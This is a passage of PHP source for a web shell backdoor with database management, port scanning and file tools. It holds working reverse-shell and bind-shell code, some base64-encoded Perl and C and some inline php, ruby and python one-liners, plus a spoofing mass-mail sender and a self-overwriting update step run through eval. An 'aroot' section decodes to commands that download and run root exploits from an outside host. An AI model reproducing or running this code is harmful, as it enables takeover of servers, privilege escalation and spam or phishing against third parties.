                    p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="' . $table['Name'] . '" /></td>');
                    p('<td><a href="javascript:settable(\'' . str_replace("'", "\'", $table['Name']) . '\');">' . $table['Name'] . '</a></td>');
                    p('<td>' . $table['Rows'] . '</td>');
                    p('<td>' . $table['Data_length'] . '</td>');
                    p('<td>' . $table['Create_time'] . ' </td>');
                    p('<td>' . $table['Update_time'] . ' </td>');
                    if ($highver) {
                        p('<td>' . $table['Engine'] . '</td>');
                        p('<td>' . $table['Collation'] . '</td>');
                    }
                    p('<td><a href="javascript:settable(\'' . str_replace("'", "\'", $table['Name']) . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . str_replace("'", "\'", $table['Name']) . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . str_replace("'", "\'", $table['Name']) . '\', \'drop\');">Drop</a></td>');
                    p('</tr>');
                }
                p('<tr class="head">');
                p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
                p('<td>Name</td>');
                p('<td>Rows</td>');
                p('<td>Data_length</td>');
                p('<td>Create_time</td>');
                p('<td>Update_time</td>');
                if ($highver) {
                    p('<td>Engine</td>');
                    p('<td>Collation</td>');
                }
                p('<td>Operate</td>');
                p('</tr>');
                p('<tr class=' . bg() . '>');
                p('<td>-</td>');
                p('<td>Total tables: ' . $table_num . '</td>');
                p('<td>' . $table_rows . '</td>');
                p('<td>' . $data_size . '</td>');
                p('<td colspan="' . ($highver ? 5 : 3) . '"></td>');
                p('</tr>');
                p("<tr class=\"" . bg() . "\"><td colspan=\"" . ($highver ? 9 : 7) . "\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input onmouseover=\"this.focus();\" class=\"input\" name=\"path\" value=\"" . SA_ROOT . $dbname . ".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" value=\"Export selection table\" /></td></tr>");
                makehide('doing', 'backupmysql');
                formfoot();
                p("</table>");
                fr($query);
            }
        }
    }
    tbfoot();
    @mysql_close();
} elseif ($action == 'backconnect') {
    if (isset($_POST['yourport']) && $_POST['yourport'] != null) {
        $yourport = $_POST['yourport'];
    } else {
        $yourport = "31337";
    }
    if (isset($_POST['yourip']) && $_POST['yourip'] != null) {
        $yourip = $_POST['yourip'];
    } else {
        $yourip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
    }
    $usedb          = array(
        'php' => 'php',
        'php console' => 'php console',
        'perl' => 'perl',
        'python' => 'python',
        'gcc' => 'gcc',
        'ruby' => 'ruby'
    );
    $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    $back_connect   = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
    $back_connect_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJybSAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJsZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7DQogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
    if ($start && $yourip && $yourport && $use) {
        if ($use == 'perl') {
            //cf('/tmp/bc.pl', $back_connect);
            //$res = execute(which('perl') . " /tmp/bc.pl $yourip $yourport &");
            cf("/tmp/bc.pl", $back_connect_p);
            $out  = wsoEx("perl /tmp/bc.pl " . $yourip . " " . $yourport . " 1>/dev/null 2>&1 &");
            $out2 = wsoEx("ps aux | grep bc.pl");
            unlink("/tmp/bc.pl");
        } elseif ($use == 'gcc') {
            cf('/tmp/bc.c', $back_connect_c);
            $res = execute('gcc -o /tmp/bc /tmp/bc.c');
            @unlink('/tmp/bc.c');
            $res = execute("/tmp/bc " . $yourip . " " . $yourport . " &");
        } elseif ($use == 'php console') {
            execute("php -r '$" . "sock=fsockopen(\"" . $yourip . "\"," . $yourport . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
        } elseif ($use == 'ruby') {
            execute("ruby -rsocket -e'f=TCPSocket.open(\"" . $yourip . "\"," . $yourport . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");
        } elseif ($use == 'python') {
            execute("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" . $yourip . "\"," . $yourport . "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
        }elseif ($use == 'php'){
        		ob_start();
        		$create = new BC($yourip,$yourport,$_SERVER['SERVER_ADDR'],5);
        }
        m("Now script try connect to " . $yourip . " port " . $yourport . "...");
    }
    formhead(array(
        'title' => 'Back Connect'
    ));
    makehide('action', 'backconnect');
    p('<p>');
    p('Your IP:');
    makeinput(array(
        'name' => 'yourip',
        'size' => 20,
        'value' => $yourip
    ));
    p('Your Port:');
    makeinput(array(
        'name' => 'yourport',
        'size' => 15,
        'value' => $yourport
    ));
    p('Use:');
    makeselect(array(
        'name' => 'use',
        'option' => $usedb,
        'selected' => $use
    ));
    makeinput(array(
        'name' => 'start',
        'value' => 'Start',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('</p>');
    formfoot();
} elseif ($action == 'bindport') {
    $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    if (isset($_POST['bindport']) && $_POST['bindport'] != null) {
        $bindport = $_POST['bindport'];
    } else {
        $bindport = "31337";
    }
    if (isset($_POST['startbind']) && isset($_POST['bindport']) && $_POST['bindport'] != null && $_POST['startbind'] != null) {
        cf("/tmp/bp.pl", $bind_port_p);
        $out  = wsoEx("perl /tmp/bp.pl " . $_POST['bindport'] . " 1>/dev/null 2>&1 &");
        $out2 = wsoEx("ps aux | grep bp.pl");
        unlink("/tmp/bp.pl");
        m("Now script binded to port " . $bindport . "...");
    }
    formhead(array(
        'title' => 'Bind Port'
    ));
    makehide('action', 'bindport');
    p('<p>');
    p('Port:');
    makeinput(array(
        'name' => 'bindport',
        'size' => 15,
        'value' => $bindport
    ));
    makeinput(array(
        'name' => 'startbind',
        'value' => 'Start',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('</p>');
    formfoot();
} elseif ($action == 'portscan') {
    !$scanip && $scanip = '127.0.0.1';
    !$scanport && $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
    formhead(array(
        'title' => 'Port Scan'
    ));
    makehide('action', 'portscan');
    p('<p>');
    p('IP:');
    makeinput(array(
        'name' => 'scanip',
        'size' => 20,
        'value' => $scanip
    ));
    p('Port:');
    makeinput(array(
        'name' => 'scanport',
        'size' => 80,
        'value' => $scanport
    ));
    makeinput(array(
        'name' => 'startscan',
        'value' => 'Scan',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('</p>');
    formfoot();
    if ($startscan) {
        p('<h2>Result</h2>');
        p('<ul class="info">');
        foreach (explode(',', $scanport) as $port) {
            $fp = @fsockopen($scanip, $port, $errno, $errstr, 1);
            if (!$fp) {
                p('<li>' . $scanip . ':' . $port . ' ------------------------ <span style="font-weight:bold;color:#f00;">Close</span></li>');
            } else {
                p('<li>' . $scanip . ':' . $port . ' ------------------------ <span style="font-weight:bold;color:#080;">Open</span></li>');
                @fclose($fp);
            }
        }
        p('</ul>');
    }
} elseif ($action == 'stringtools') {
    if (!function_exists('hex2bin')) {
        function hex2bin($p)
        {
            return decbin(hexdec($p));
        }
    }
    if (!function_exists('hex2ascii')) {
        function hex2ascii($p)
        {
            $r = '';
            for ($i = 0; $i < strLen($p); $i += 2) {
                $r .= chr(hexdec($p[$i] . $p[$i + 1]));
            }
            return $r;
        }
    }
    if (!function_exists('ascii2hex')) {
        function ascii2hex($p)
        {
            $r = '';
            for ($i = 0; $i < strlen($p); ++$i)
                $r .= dechex(ord($p[$i]));
            return strtoupper($r);
        }
    }
    if (!function_exists('full_urlencode')) {
        function full_urlencode($p)
        {
            $r = '';
            for ($i = 0; $i < strlen($p); ++$i)
                $r .= '%' . dechex(ord($p[$i]));
            return strtoupper($r);
        }
    }
    
    echo '<h1>String conversions</h1><div class=content>';
    $stringTools = array(
        'Base64 encode' => 'base64_encode',
        'Base64 decode' => 'base64_decode',
        'Url encode' => 'urlencode',
        'Url decode' => 'urldecode',
        'Full urlencode' => 'full_urlencode',
        'md5 hash' => 'md5',
        'sha1 hash' => 'sha1',
        'crypt' => 'crypt',
        'CRC32' => 'crc32',
        'ASCII to HEX' => 'ascii2hex',
        'HEX to ASCII' => 'hex2ascii',
        'HEX to DEC' => 'hexdec',
        'HEX to BIN' => 'hex2bin',
        'DEC to HEX' => 'dechex',
        'DEC to BIN' => 'decbin',
        'BIN to HEX' => 'bin2hex',
        'BIN to DEC' => 'bindec',
        'String to lower case' => 'strtolower',
        'String to upper case' => 'strtoupper',
        'Htmlspecialchars' => 'htmlspecialchars',
        'String length' => 'strlen'
    );
    if (empty($_POST['ajax']) && !empty($_POST['p1']))
        $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
    echo "<form name='toolsForm' method='post'>";
    makehide('action', 'stringtools');
    echo "<select name='selectTool'>";
    foreach ($stringTools as $k => $v)
        echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
    echo "</select><input type='submit' class='bt' value='Convert'/><br><textarea onmouseover='this.focus();' name='input' cols='100' rows='25' style='margin-top:5px'>" . $_POST['input'] . "</textarea></form><pre class='ml1' style='white-space:normal;" . (empty($_POST['selectTool']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
    if (!empty($_POST['selectTool'])) {
        if (function_exists($_POST['selectTool']))
            echo htmlspecialchars($_POST['selectTool']($_POST['input']));
    }
    echo "</pre></div>";
} elseif ($action == 'email') {
    $randomizer = isset($_POST['randomfr']) && $_POST['randomfr'] ? "1" : "0";
    $splitm     = isset($_POST['splitm']) && $_POST['splitm'] ? "1" : "0";
    if ((!empty($_POST["to"])) && (!empty($_POST["contents"])) && ((!empty($_POST["email"])) || $randomizer)) {
        for ($counter = 0; $counter < $_POST['times']; $counter++) {
            $femail = $_POST['email'];
            if ($randomizer) {
                $femail = generateRandomString(5) . "@" . generateRandomString(5) . ".com";
            }
            $rt = $femail;
            if ($_POST['rt'] != "") {
                $rt = $_POST['rt'];
            }
            $random_hash = md5(date('r', time()));
            $headers     = 'From: ' . $_POST["name"] . ' <' . $femail . ">\r\n" . 'Reply-To: ' . $rt;
            $message     = $_POST['contents'];
            $headers .= "\r\nMIME-Version: 1.0\r\n";
            if ($_FILES['file']['name'][0] != "") {
                $headers .= mailAttachmentHeader($message);
                $message = '';
                echo 'Sending with attachment...<br/>';
            }
            if ($splitm) {
                $messagez = str_split($message, $_POST['saf']);
                foreach ($messagez as $spmessage) {
                    if (@mail($_POST["to"], $_POST["subject"], $spmessage, $headers)) { //'From: ' . $_POST["name"] . ' <' . $_POST["email"] . ">\r\n" . 'Reply-To: ' . $rt)){
                        echo "Email sent to " . htmlentities($_POST['to']) . " from " . $femail . "!<br/>";
                    } else {
                        echo "Email sending failed.<br/>";
                    }
                    usleep(100000);
                }
            } else {
                if (@mail($_POST["to"], $_POST["subject"], $message, $headers)) { //'From: ' . $_POST["name"] . ' <' . $_POST["email"] . ">\r\n" . 'Reply-To: ' . $rt)){
                    echo "Email sent to " . htmlentities($_POST['to']) . " from " . $femail . "!<br/>";
                } else {
                    echo "Email sending failed.<br/>";
                }
            }
        }
    } else {
        echo '<script language="javascript">
function add() {
	var element = document.createElement("tr");
	element.innerHTML=\'<td></td><td><input type="file" name="file[]">\';
    var foo = document.getElementById("file");
    insertAfter(foo,element);
}
</script>
<script language="javascript">
function insertAfter(referenceNode, newNode) {
    referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);
}
</script>
<form method="post" enctype="multipart/form-data">
<table width="100%">
	<tr>
	<td>To:</td>
	<td><input onmouseover="this.focus();" type="text" name="to"></td>
	</tr>
	<tr>
	<td>From Name:</td>
	<td><input onmouseover="this.focus();" type="text" name="name"></td>
	</tr>
	<tr>
	<td>From Email:</td>
	<td><input onmouseover="this.focus();" type="text" name="email"><input type="checkbox" value="1" name="randomfr" id="randomfr"><label for="randomfr" value="Randomize">Randomize</label></td>
	</tr>
	<tr>
	<td>Reply-To Email:</td>
	<td><input onmouseover="this.focus();" type="text" name="rt"></td>
	</tr>
	<tr id="file">
	<td>Attachment:</td>
	<td><input type="file" name="file[]"/><input type="button" onclick="add()" value="Add More"></td>
	</tr>
	<tr>
	<td>Subject:</td>
	<td><input onmouseover="this.focus();" type="text" name="subject"></td>
	</tr>
	<tr>
	<td>Message:</td>
	<td><textarea onmouseover="this.focus();" name="contents"></textarea></td>
	</tr>
	<tr>
	<td>Split Message:</td>
	<td><input type="checkbox" value="1" name="splitm" id="splitm"><label for="splitm" value="Split Message">Split Messages</label></td>
	</tr>
	<tr>
	<td>Characters per Message(If Split Message is checked):</td>
	<td><input type="number" name="saf" value="140"></td>
	</tr>
	<tr>
	<td>Send How Many Times:</td>
	<td><input type="number" onmouseover="this.focus();" min="1" value="1" name="times"></td>
	</tr>
	<tr>
	<td></td><td><input type="submit" class="bt" value="Send"></td>
	</tr>
	</table>';
        makehide("action", "email");
        echo '</form>';
    }
} elseif ($action == "checkupdates") {
    if ($checkforupdates == true && $cforupurl != "") {
        if (isset($_POST['force']) && $_POST['force'] == "true") {
            $cuuff = $cforupurl . "?u=" . urlencode((!empty($_SERVER['HTTPS'])) ? "https://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI'] : "http://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI']);
        } else {
            $cuuff = $cforupurl . "?v=" . $version;
        }
        $res = file_get_contents($cuuff);
        if (!$res) {
            $res = get_data($cuuff);
        }
        if ($res != "") {
            $ourFileHandle = fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), "w");
            eval(base64_decode("ZndyaXRlKCRvdXJGaWxlSGFuZGxlLHN0cl9yZXBsYWNlKCJDRlVMSU5FSEVSRSIsJyRjaGVja2ZvcnVwZGF0ZXMgICAgPSAnLnN0cmJvb2woJGNoZWNrZm9ydXBkYXRlcykuJzsnLHN0cl9yZXBsYWNlKCJIU0JMSU5FSEVSRSIsJyRoZWxwc3VwcG9ydGJvb3RlciAgPSAnLnN0cmJvb2woJGhlbHBzdXBwb3J0Ym9vdGVyKS4nOycsc3RyX3JlcGxhY2UoIkNGVVVMSU5FSEVSRSIsJyRjaGVja2ZvcnVwZGF0ZXN1cmwgPSAiJy4kY2hlY2tmb3J1cGRhdGVzdXJsLiciOycsc3RyX3JlcGxhY2UoIkFFUExJTkVIRVJFIiwnJGFkYXB0aXZlZXJyb3JwYWdlICA9ICcuc3RyYm9vbCgkYWRhcHRpdmVlcnJvcnBhZ2UpLic7JyxzdHJfcmVwbGFjZSgiUEFTU1dPUkRMSU5FSEVSRSIsJyRwYXNzICAgICAgICAgICAgICAgPSAiJy4kcGFzcy4nIjsnLGh0bWxfZW50aXR5X2RlY29kZSgkcmVzKSkpKSkpKTs=")); //make sure we keep our own password, don't worry it is just writing the new data but because it does a string replace it replaces itself so to avoid this we do this
            fclose($ourFileHandle);
    				scookie('showupdate', '', -86400 * 365);
            echo "Shell updated! Refreshing in <span id='counter'>5</span> seconds...<meta http-equiv=\"refresh\" content=\"5\">" . '<script>function countdown(){var e=document.getElementById("counter");if(parseInt(e.innerHTML)>0){e.innerHTML=parseInt(e.innerHTML)-1}}setInterval(function(){countdown()},1e3)</script>';
        } else {
            echo "Shell is up to date! Thank you for checking!";
        }
        echo '<br/><form method="POST"><input type="hidden" name="force" value="true"><input type="submit" value="Force Update">';
        makehide("action", "checkupdates");
        echo "</form>";
    } else {
        echo "Updating has been disabled or the check for update URL is empty... Please try again after fixing these problems.";
    }
} elseif ($action == 'aroot') {
    $r00t = "IyEvdXNyL2Jpbi9wZXJsIA0KIyBFeHBsb2l0IHRvb2xzIHYyLjAgY29kZWQgYnkgaXNrb3JwaXR4 IChUdXJraXNoIEhhY2tlcikNCiMgbGludXggc2VydmVybGVyZGUgZ2VjZXJsaWRpcg0KIyBpeWkg c2Fuc2xhcjopDQojIGJ5IGlza29ycGl0eA0KeyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy80NCIpOyAg DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOyANCnN5c3RlbSgiLi80NCIpOyANCnN5c3RlbSgiaWQi KTsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOTUy MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA5NTIxIik7IA0Kc3lzdGVtKCIuLzk1MjEiKTsgDQpz eXN0ZW0oImlkIik7ICANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvZnJvb3QiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZnJvb3QiKTsgDQpzeXN0ZW0o Ii4vZnJvb3QiKTsgDQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7 DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oIndnZXQgMjc3MDQuYyBkb3du bG9hZHMuc2VjdXJpdHlmb2N1cy5jb20vdnVsbmVyYWJpbGl0aWVzL2V4cGxvaXRzLzI3NzA0LmMi KTsgDQpzeXN0ZW0oImdjYyAyNzcwNC5jIC1vIDI3NzA0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IDI3NzA0Iik7IA0Kc3lzdGVtKCIuLzI3NzA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJ ZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8v d2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgtMS5jIik7IA0Kc3lzdGVtKCJnY2MgLVdh bGwgLW8gMTgtMSAxOC0xLmMiKTsgDQpzeXN0ZW0oImdjYyAtV2FsbCAtbTY0IC1vIDE4LTMgMTgt MS5jIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDE4 LTMiKTsgDQpzeXN0ZW0oIi4vMTgtMSIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgt MyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj dHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl L2NjLzE4LTIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMiIpOyANCnN5c3RlbSgiLi8xOC0y Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0 cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv Y2MvMTgtMSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOC0xIik7IA0Kc3lzdGVtKCIuLzE4LTEi KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry bCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9ydW4iKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVuIik7IA0Kc3lzdGVtKCIuL3J1biIpOyAN CnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2Nc biI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4 cGxvaXQuYyIpOyAgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 DQpzeXN0ZW0oIndnZXQgcnVuX2V4cGxvaXRzLnNoIHdnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NN U19GSUxFUy9maWxlL2NjL3J1bl9leHBsb2l0cy5zaCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBy dW5fZXhwbG9pdHMuc2giKTsgDQpzeXN0ZW0oIi4vcnVuX2V4cGxvaXRzLnNoIik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6 Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGV4cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4 cCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwIik7ICANCnN5c3RlbSgi Y2htb2QgNzc3IGV4cCIpOyANCnN5c3RlbSgiLi9leHAiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lz dGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHAxIik7ICAN CnN5c3RlbSgiY2htb2QgNzc3IGV4cDEiKTsgDQpzeXN0ZW0oIi4vZXhwMSIpOyANCnN5c3RlbSgi aWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2Nj L2V4cDIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMiIpOyANCnN5c3RlbSgiLi9leHAyIik7 IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ TEVTL2ZpbGUvY2MvZXhwMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7IA0Kc3lzdGVt KCIuL2V4cDMiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4cDQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3Nzcg ZXhwNCIpOyANCnN5c3RlbSgiLi9leHA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dl dCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwNSIpOyAgDQpzeXN0ZW0o ImNobW9kIDc3NyBleHA1Iik7IA0Kc3lzdGVtKCIuL2V4cDUiKTsgDQpzeXN0ZW0oImlkIik7IA0K c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA2Iik7 ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4cDYiKTsgDQpzeXN0ZW0oIi4vZXhwNiIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl 